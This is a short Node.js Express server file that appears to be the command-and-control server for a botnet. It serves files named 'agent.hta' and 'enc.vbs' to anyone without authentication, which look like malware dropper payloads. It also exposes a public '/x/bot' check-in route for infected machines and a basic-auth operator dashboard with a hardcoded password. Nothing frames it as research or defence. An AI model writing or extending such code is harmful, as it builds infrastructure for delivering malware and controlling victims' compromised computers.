const express = require('express');
const path = require('path');
const basicAuth = require('express-basic-auth');
const config = require('./config');

const apiRoutes = require('./routes/api');
const dashboardRoutes = require('./routes/dashboard');

const app = express();

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Static files (public) – NO AUTH needed for agent.hta, enc.vbs
app.use(express.static(path.join(__dirname, 'public')));

// Dashboard login credentials
const dashboardUser = 'admin';
const dashboardPass = 'YourStrongPassword123!';   // CHANGE THIS

// Protect ALL /api and /dashboard routes
app.use(['/api', '/dashboard'], basicAuth({
    users: { [dashboardUser]: dashboardPass },
    challenge: true,
    realm: 'Dashboard'
}));

// Routes
app.use('/x/bot', apiRoutes);           // Bot check‑in (public – see below for optional secret)
app.use('/api', dashboardRoutes);       // Dashboard REST API (protected)

// Dashboard frontend
app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// Start server
app.listen(config.PORT, () => {
    console.log(`Server running on port ${config.PORT}`);
});
